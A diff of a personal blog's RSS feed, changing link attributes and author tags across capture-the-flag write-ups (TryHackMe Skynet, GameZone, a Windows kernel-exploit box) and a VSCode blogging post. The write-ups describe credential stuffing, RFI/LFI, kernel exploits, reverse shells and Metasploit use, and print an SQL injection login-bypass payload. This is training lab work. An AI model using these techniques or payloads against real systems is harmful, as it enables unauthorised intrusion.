+<p>So going down the list I found one kernel exploit that seemed particularly interesting : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreffer ">MS10-059</a>.</p>
 <p>Once uploaded, just run it without argument and it&rsquo;ll tell you that it requires an IP and port, in order to pop a reverse shell.</p>
 <p>So I ran it like so :</p>
 <div class="highlight"><div class="chroma">
@@ -870,12 +870,12 @@ Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
 <p></p>
 <h2 id="outro">Outro</h2>
 <p>This has been my first even &ldquo;medium&rdquo; rated box and I am very happy I did it on my own. I found this initial shell pretty easy, but then got quite confused when I couldn&rsquo;t work with <code>winpeas</code> and other executables. This is when I started researching for other way to enum the box and found the <code>python exploit suggester</code>. From, here it was some googling and mor trial and error, but it worked!</p>
-]]></description></item><item><title>THM - Skynet without MetaSploit</title><link>https://www.masoopy.com/thm-skynet-without-metasploit/</link><pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-skynet-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>THM - Skynet without MetaSploit</title><link>https://www.masoopy.com/thm-skynet-without-metasploit/</link><pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/thm-skynet-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/Skynet_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
 <p>A new, mysterious box. It is Terminator themed, but I have no idea what it will reveal Let&rsquo;s dive in!</p>
 <h2 id="target">Target</h2>
-<p><a href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener noreferrer">THM - Skynet</a></p>
+<p><a href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener noreffer ">THM - Skynet</a></p>
 <h2 id="recon">Recon</h2>
 <p>Not much recon here. Contrary to our previous targets which were &ldquo;training boxes&rdquo;, this one is doesn&rsquo;t hold your hand. Let&rsquo;s directly enumerate it!</p>
 <h2 id="enum">Enum</h2>
@@ -952,7 +952,7 @@ OS and Service detection performed. Please report any incorrect results at https
 <p><code>Nikto</code> and <code>gobuster</code> will reveal a <code>SquirrelMail version 1.4.23 [SVN]</code> installation :</p>
 <p></p>
 <h2 id="exploitation">Exploitation</h2>
-<p>Now, using <code>Burp</code>, we&rsquo;ll try some <a href="https://en.wikipedia.org/wiki/Credential_stuffing" target="_blank" rel="noopener noreferrer">credentials stuffing</a> in order to login. From our first SMB recon, we discovered a plausible user : <code>milesdyson</code>, and a list of passwords.</p>
+<p>Now, using <code>Burp</code>, we&rsquo;ll try some <a href="https://en.wikipedia.org/wiki/Credential_stuffing" target="_blank" rel="noopener noreffer ">credentials stuffing</a> in order to login. From our first SMB recon, we discovered a plausible user : <code>milesdyson</code>, and a list of passwords.</p>
 <p>In the intruder&rsquo;s tab set up a <code>sniper</code> attack, using <code>milesdyson</code> as user and the password field as the only payload :</p>
 <p></p>
 <p>We, now, load the password list found during SMB enumeration :</p>
@@ -969,7 +969,7 @@ OS and Service detection performed. Please report any incorrect results at https
 <p>Exploring the share will reveal an odd file called <code>important.txt</code>. Inside this file, we learn the existence of new <code>CMS</code> located at : <code>http://$target_ip/45kra24zxs28v3yd/</code>.</p>
 <p>Further scanning reveals admin page :</p>
 <p></p>
-<p>Doing a quick search, we&rsquo;ll find the <code>Cuppa CMS</code> is vulnerable to <a href="https://www.exploit-db.com/exploits/25971" target="_blank" rel="noopener noreferrer">RFI/LFI</a>.</p>
+<p>Doing a quick search, we&rsquo;ll find the <code>Cuppa CMS</code> is vulnerable to <a href="https://www.exploit-db.com/exploits/25971" target="_blank" rel="noopener noreffer ">RFI/LFI</a>.</p>
 <h3 id="getting-initial-shell">Getting Initial Shell</h3>
 <p>We craft the URL to match our target, replacing <code>cuppa</code> by <code>administrator</code>, set up a <code>listener</code> and get initial shell :</p>
 <p></p>
@@ -977,28 +977,28 @@ OS and Service detection performed. Please report any incorrect results at https
 <p></p>
 <h3 id="privesc">PrivEsc</h3>
 <p>We download our classic tools to the box and launch them. Unfortunately here, I didn&rsquo;t find anything obvious. I tried a few probable exploits, such as <code>dirtyc0w</code>, and a few others, but nothing worked.</p>
-<p>Finally, I paid closer attention to kernel version, and noticed that <code>4.8.0-58-generic</code> might be <a href="https://www.exploit-db.com/exploits/43418" target="_blank" rel="noopener noreferrer">vulnerable</a>.</p>
+<p>Finally, I paid closer attention to kernel version, and noticed that <code>4.8.0-58-generic</code> might be <a href="https://www.exploit-db.com/exploits/43418" target="_blank" rel="noopener noreffer ">vulnerable</a>.</p>
 <p>After a few quick steps of download, compile, &ldquo;send&rdquo; to target, I was ready to run it, and BOOM! it worked:</p>
 <p></p>
 <p>Finally, we collect <code>root's flag</code> :</p>
 <p></p>
 <h2 id="outro">Outro</h2>
-<p>Another box rooted, it seems that even the inventor of <a href="https://terminator.fandom.com/wiki/Neural_Net_CPU" target="_blank" rel="noopener noreferrer">neural-net processor</a> can&rsquo;t resist us! :)</p>
-]]></description></item><item><title>Blogging With VSCode</title><link>https://www.masoopy.com/blogging-with-vscode/</link><pubDate>Mon, 22 Feb 2021 20:49:23 +0100</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/blogging-with-vscode/</guid><description><![CDATA[<div class="featured-image">
+<p>Another box rooted, it seems that even the inventor of <a href="https://terminator.fandom.com/wiki/Neural_Net_CPU" target="_blank" rel="noopener noreffer ">neural-net processor</a> can&rsquo;t resist us! :)</p>
+]]></description></item><item><title>Blogging With VSCode</title><link>https://www.masoopy.com/blogging-with-vscode/</link><pubDate>Mon, 22 Feb 2021 20:49:23 +0100</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/blogging-with-vscode/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/VSCode.png" referrerpolicy="no-referrer">
-            </div><p>In a previous post, I explained <a href="https://www.masoopy.com/going-from-wordpress-to-hugo-and-github-actions/" target="_blank" rel="noopener noreferrer">why I left Wordpress and how I did the move to Hugo</a>. Now, let me explain how I write my articles.</p>
+            </div><p>In a previous post, I explained <a href="https://www.masoopy.com/going-from-wordpress-to-hugo-and-github-actions/" target="_blank" rel="noopener noreffer ">why I left Wordpress and how I did the move to Hugo</a>. Now, let me explain how I write my articles.</p>
 <h2 id="blogging-in-markdown">Blogging in Markdown</h2>
-<p>One of the main reason that me want to change what I used to do for several years was <a href="https://daringfireball.net/projects/markdown/" target="_blank" rel="noopener noreferrer">Markdown</a>. I love the simplicity of this format, and it gives me great flexibility! I can start writing an article at home in my IDE, and continue it on my mobile phone, or from any computer using an SSH access. The final articles are flat files, no DB, no fuss!</p>
+<p>One of the main reason that me want to change what I used to do for several years was <a href="https://daringfireball.net/projects/markdown/" target="_blank" rel="noopener noreffer ">Markdown</a>. I love the simplicity of this format, and it gives me great flexibility! I can start writing an article at home in my IDE, and continue it on my mobile phone, or from any computer using an SSH access. The final articles are flat files, no DB, no fuss!</p>
 <h2 id="why-vscode">Why VSCode?</h2>
 <p>I started doing it with <code>vim</code>, like the rest of my &ldquo;code&rdquo; (I don&rsquo;t code, just write some bash and <code>ansible</code>), but lately I wanted something a bit less CLI for this kind of tasks. While I still use <code>vim</code> when I need to play with pattern of text, I now prefer an IDE with a GUI for projects with multiple files.</p>
-<p>After trying a few of them, I decided to use <a href="https://code.visualstudio.com/" target="_blank" rel="noopener noreferrer">VSCode</a>. It is free, looks modern, has a <a href="https://www.nordtheme.com/" target="_blank" rel="noopener noreferrer">Nord theme</a>, and plenty of extensions!</p>
+<p>After trying a few of them, I decided to use <a href="https://code.visualstudio.com/" target="_blank" rel="noopener noreffer ">VSCode</a>. It is free, looks modern, has a <a href="https://www.nordtheme.com/" target="_blank" rel="noopener noreffer ">Nord theme</a>, and plenty of extensions!</p>
 <h2 id="extensions-for-blogging">Extensions for blogging</h2>
 <p>Since an IDE first role, isn&rsquo;t to write text, but code, this is where the vast amount of extensions that VSCode has to offer come useful!</p>
 <p>Here are the ones I use :</p>
 <ul>
-<li>Spell check extension, a must-have for grammar and syntax spellchecking : <a href="https://github.com/davidlday/vscode-languagetool-linter" target="_blank" rel="noopener noreferrer">LanguageTool Linter for Visual Studio Code</a> ;</li>
-<li>Since I am writing bits of code here and there, it avoids typo in those : <a href="https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker" target="_blank" rel="noopener noreferrer">Code Spell Checker</a> ;</li>
-<li><a href="https://github.com/arcticicestudio/nord-visual-studio-code" target="_blank" rel="noopener noreferrer">Nord Theme</a>.</li>
+<li>Spell check extension, a must-have for grammar and syntax spellchecking : <a href="https://github.com/davidlday/vscode-languagetool-linter" target="_blank" rel="noopener noreffer ">LanguageTool Linter for Visual Studio Code</a> ;</li>
+<li>Since I am writing bits of code here and there, it avoids typo in those : <a href="https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker" target="_blank" rel="noopener noreffer ">Code Spell Checker</a> ;</li>
+<li><a href="https://github.com/arcticicestudio/nord-visual-studio-code" target="_blank" rel="noopener noreffer ">Nord Theme</a>.</li>
 </ul>
 <p>And, that&rsquo;s it!</p>
 <h2 id="writing-pipeline">Writing pipeline</h2>
@@ -1007,12 +1007,12 @@ OS and Service detection performed. Please report any incorrect results at https
 <h2 id="just-write">Just write!</h2>
 <p>This whole new setup allow me to &ldquo;just write&rdquo;! I don&rsquo;t have to deal with online editor, or updates done to them, I do not depend on someone&rsquo;s logic for using a WYSIWYG editor.</p>
 <p>Last but not least, the day I want to change, I am pretty sure I&rsquo;ll find tons of way to convert Markdown to anything I like by that time!</p>
-]]></description></item><item><title>THM - GameZone</title><link>https://www.masoopy.com/thm-gamezone/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-gamezone/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>THM - GameZone</title><link>https://www.masoopy.com/thm-gamezone/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/thm-gamezone/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/GameZone_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
-<p>Trying to get a change from <a href="https://www.masoopy.com/tags/htb/" target="_blank" rel="noopener noreferrer">HTB</a>, today I&rsquo;ll write about a <a href="https://www.masoopy.com/tags/thm/" target="_blank" rel="noopener noreferrer">THM</a> box! And this time, we&rsquo;ll also have a look at SQLi!</p>
+<p>Trying to get a change from <a href="https://www.masoopy.com/tags/htb/" target="_blank" rel="noopener noreffer ">HTB</a>, today I&rsquo;ll write about a <a href="https://www.masoopy.com/tags/thm/" target="_blank" rel="noopener noreffer ">THM</a> box! And this time, we&rsquo;ll also have a look at SQLi!</p>
 <h2 id="target">Target</h2>
-<p><a href="https://tryhackme.com/room/gamezone" target="_blank" rel="noopener noreferrer">THM - GameZone</a></p>
+<p><a href="https://tryhackme.com/room/gamezone" target="_blank" rel="noopener noreffer ">THM - GameZone</a></p>
 <h2 id="recon">Recon</h2>
 <p>Quick recon according to logo and info :</p>
 <ul>
@@ -1236,10 +1236,10 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 </code></pre></td></tr></table>
 </div>
 </div><p>Like we could guess, there is not much information from our scanners.</p>
-<p>However, manual browsing revealed a <code>login and a search form</code>. Since we are working on <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer">SQLi</a>, they are most probably vulnerable!</p>
+<p>However, manual browsing revealed a <code>login and a search form</code>. Since we are working on <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreffer ">SQLi</a>, they are most probably vulnerable!</p>
 <p>It doesn&rsquo;t seem the search function is working (none of our request displayed in Burp show the search term), and we&rsquo;ll try to exploit the authentication box.</p>
 <h2 id="exploitation">Exploitation</h2>
-<p>Let&rsquo;s just try to use <code>' or 1=1 -- </code> (there is an <a href="https://portswigger.net/web-security/sql-injection/cheat-sh" target="_blank" rel="noopener noreferrer">extra space at the end</a> as username and a blank password, and we are in!</p>
+<p>Let&rsquo;s just try to use <code>' or 1=1 -- </code> (there is an <a href="https://portswigger.net/web-security/sql-injection/cheat-sh" target="_blank" rel="noopener noreffer ">extra space at the end</a> as username and a blank password, and we are in!</p>
 <p></p>
 <p>We now access to another search function, which this time, seems to be working, because this time, we notice that the search term in our Burp Request :</p>
 <p></p>
@@ -1263,7 +1263,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
-<p>We now save our hash into hash.txt, and we can use various <a href="https://md5decrypt.net/en/" target="_blank" rel="noopener noreferrer">online resources</a> to detect the hash type. OUr is <code>SHA256</code>.</p>
+<p>We now save our hash into hash.txt, and we can use various <a href="https://md5decrypt.net/en/" target="_blank" rel="noopener noreffer ">online resources</a> to detect the hash type. OUr is <code>SHA256</code>.</p>
 <p>Then we run :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1295,7 +1295,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 </code></pre></td></tr></table>
 </div>
 </div><p>Then, we can check it worked with <code>curl -I 127.0.0.1:10000</code> which should returns a <code>200</code> status code.</p>
-<p>As far, as I&rsquo;d like to complete this without <code>MetaSploit</code>, it seems I am stuck! I found <a href="https://github.com/roughiz/Webmin-1.910-Exploit-Script" target="_blank" rel="noopener noreferrer">this repo</a>, for a manual exploitation. However, it is a Python2 script, and it seems some modules are deprecated&hellip; which might why I am not able to connect back to my listener :</p>
+<p>As far, as I&rsquo;d like to complete this without <code>MetaSploit</code>, it seems I am stuck! I found <a href="https://github.com/roughiz/Webmin-1.910-Exploit-Script" target="_blank" rel="noopener noreffer ">this repo</a>, for a manual exploitation. However, it is a Python2 script, and it seems some modules are deprecated&hellip; which might why I am not able to connect back to my listener :</p>
 <p></p>
 <p>So&hellip; We now, run <code>msfconsole</code> and use <code>unix/webapp/webmin_show_cgi_exec</code>, set the required options and run it. Boom! We have a shell :</p>
 <p></p>
